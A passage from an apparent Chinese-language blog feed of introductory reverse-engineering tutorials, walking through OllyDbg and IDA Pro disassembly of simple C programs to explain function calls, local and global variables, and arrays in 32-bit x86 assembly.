data-num="5"></td><td><pre><span class="token number">0040100</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX                              <span class="token punctuation">;</span>  对eax进行清零</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040100</span>E  \<span class="token punctuation">.</span>  C3            RETN                                     <span class="token punctuation">;</span>  返回</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327170908883.png" alt="image-20220327170908883" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401010</span>  <span class="token operator">/</span>$  <span class="token number">8</span>B4424 <span class="token number">08</span>     MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4C24 <span class="token number">04</span>     MOV ECX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401018</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">03</span>C1          ADD EAX<span class="token punctuation">,</span>ECX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0040101</span>A  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040101</span>B      <span class="token number">90</span>            NOP                                      <span class="token punctuation">;</span>  call的地址，就是函数开始的地方，ret或者retn就是函数结束的地方，pop eip jmp eip</pre></td></tr></table></figure><h3 id="静态分析"><a class="anchor" href="#静态分析">#</a> 静态分析</h3>
<p>ida pro 打开如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327171038457.png" alt="image-20220327171038457" /></p>
<p>f5 反汇编，调用 sub_401010 函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327171120924.png" alt="image-20220327171120924" /></p>
<p>sub_401010 函数如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327171148160.png" alt="image-20220327171148160" /></p>
<p>add 汇编代码：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327171241181.png" alt="image-20220327171241181" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/2C21CB942FA37E5975FF8FFBD3F3BF48.gif" alt="img-2C21CB942FA37E5975FF8FFBD3F3BF48" /></p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之32位变量与数组解析</title>
    <url>/article/16aed282.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/05A99A08A9B876706BE43ED2F73E56FF.gif" alt="img-05A99A08A9B876706BE43ED2F73E56FF" /></p>
<h2 id="局部变量"><a class="anchor" href="#局部变量">#</a> 局部变量</h2>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	 <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	 <span class="token function">add</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	 <span class="token keyword">int</span> z<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	 z<span class="token operator">=</span>x<span class="token operator">+</span>y<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	 <span class="token keyword">return</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 打开应用程序，找到入口进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330182402453.png" alt="image-20220330182402453" /></p>
<p>函数分析：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330182641866.png" alt="image-20220330182641866" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  main起始位置</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401003</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>EC <span class="token number">08</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401006</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 FC <span class="token number">05000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">5</span>               <span class="token punctuation">;</span>  第一个局部变量 ebp <span class="token operator">-</span> <span class="token number">4</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F8 <span class="token number">06000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">6</span>               <span class="token punctuation">;</span>  第二个局部变量 ebp <span class="token operator">-</span> <span class="token number">8</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 F8       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401017</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX                                 <span class="token punctuation">;</span> <span class="token operator">/</span>Arg2</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401018</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4D FC       MOV ECX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0040101</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span> <span class="token operator">|</span>Arg1</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0040101</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">09000000</span>   CALL local<span class="token punctuation">.</span><span class="token number">0040102</span>A                      <span class="token punctuation">;</span> \local<span class="token punctuation">.</span><span class="token number">0040102</span>A</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00401021</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00401024</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401026</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401028</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00401029</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">0040102</span>A  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">0040102</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">0040102</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span>  以push寄存器的方式来代替sub esp<span class="token punctuation">,</span><span class="token number">4</span>，为局部变量开辟内存</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">0040102</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">08</span>       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  获取局部变量</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">00401031</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">0</span>C       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span>             <span class="token punctuation">;</span>  因为栈重新开辟了位置导致局部变量的位置产生变化</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">00401034</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8945</span> FC       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token number">00401037</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 FC       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  将局部变量的值放入eax用于返回</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token number">0040103</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token number">0040103</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token number">0040103</span>D  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330183615339.png" alt="image-20220330183615339" /></p>
<h2 id="全局变量"><a class="anchor" href="#全局变量">#</a> 全局变量</h2>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> z<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	 <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	 z<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	 <span class="token function">add</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	 <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	 <span class="token keyword">return</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token operator">+</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401001</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401003</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>EC <span class="token number">08</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401006</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 FC <span class="token number">05000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">5</span>               <span class="token punctuation">;</span>  局部变量<span class="token number">1</span>赋值</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040100</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F8 <span class="token number">06000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">6</span>               <span class="token punctuation">;</span>  局部变量<span class="token number">2</span>赋值</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  C705 C0844000<span class="token operator">></span>MOV DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">4084</span>C0<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">7</span>              <span class="token punctuation">;</span>  全局变量初始化</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040101</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 F8       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401021</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            PUSH EAX                                 <span class="token punctuation">;</span> <span class="token operator">/</span>Arg2</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401022</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B4D FC       MOV ECX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401025</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">51</span>            PUSH ECX                                 <span class="token punctuation">;</span> <span class="token operator">|</span>Arg1</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00401026</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">09000000</span>   CALL global<span class="token punctuation">.</span><span class="token number">00401034</span>                     <span class="token punctuation">;</span> \global<span class="token punctuation">.</span><span class="token number">00401034</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">0040102</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">0040102</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401030</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00401032</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">00401033</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330184318234.png" alt="image-20220330184318234" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401034</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401035</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401037</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">08</span>       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0040103</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">0</span>C       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0040103</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0305</span> C0844000 ADD EAX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">4084</span>C0<span class="token punctuation">]</span>            <span class="token punctuation">;</span>  DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">4084</span>C0<span class="token punctuation">]</span>与上面一致，是因为全局变量存储的是一个地址，不会因为函数或堆栈的变化而变化</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401043</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401044</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330184600316.png" alt="image-20220330184600316" /></p>
<p>全局变量是单独存储的，它的位置基本不变。</p>
<h2 id="数组"><a class="anchor" href="#数组">#</a> 数组</h2>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">static</span> <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 静态整数型数组</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>s<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="9"></td><td><pre>		s<span class="token operator">=</span>s<span class="token operator">+</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	</pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	</pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 分析：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330185018846.png" alt="image-20220330185018846" /></p>
<p>进入主函数：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330185036658.png" alt="image-20220330185036658" /></p>
<p>函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401000</span>  <span class="token operator">/</span>$  <span class="token number">83</span>EC <span class="token number">0</span>C       SUB ESP<span class="token punctuation">,</span><span class="token number">0</span>C                               <span class="token punctuation">;</span>  为局部变量开辟内存</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401003</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C9          XOR ECX<span class="token punctuation">,</span>ECX                              <span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401005</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX                              <span class="token punctuation">;</span>  i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401007</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">56</span>            PUSH ESI</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401008</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">57</span>            PUSH EDI</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401009</span>  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">8</span>BB8 <span class="token number">30704000</span> <span class="token operator">/</span>MOV EDI<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token operator">+</span><span class="token number">407030</span><span class="token punctuation">]</span>       <span class="token punctuation">;</span>  <span class="token number">407030</span>是数组的头 <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>，也即数组的基址</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040100F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C0 <span class="token number">04</span>       <span class="token operator">|</span>ADD EAX<span class="token punctuation">,</span><span class="token number">4</span>                               <span class="token punctuation">;</span>  索引自增</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401012</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">03</span>CF          <span class="token operator">|</span>ADD ECX<span class="token punctuation">,</span>EDI                             <span class="token punctuation">;</span>  s <span class="token operator">=</span> s <span class="token operator">+</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401014</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83F</span><span class="token number">8</span> <span class="token number">0</span>C       <span class="token operator">|</span>CMP EAX<span class="token punctuation">,</span><span class="token number">0</span>C</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401017</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">894</span>C04 <span class="token number">04</span>     <span class="token operator">|</span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span>EAX<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ECX        <span class="token punctuation">;</span>  b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s；esp <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">=</span> b数组的基址</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">0040101</span>B  <span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">^</span> <span class="token number">7</span>C EC         \JL SHORT Arrays<span class="token punctuation">.</span><span class="token number">00401009</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">0040101</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D7424 <span class="token number">08</span>     LEA ESI<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">00401021</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  BF <span class="token number">03000000</span>   MOV EDI<span class="token punctuation">,</span><span class="token number">3</span>                                <span class="token punctuation">;</span>  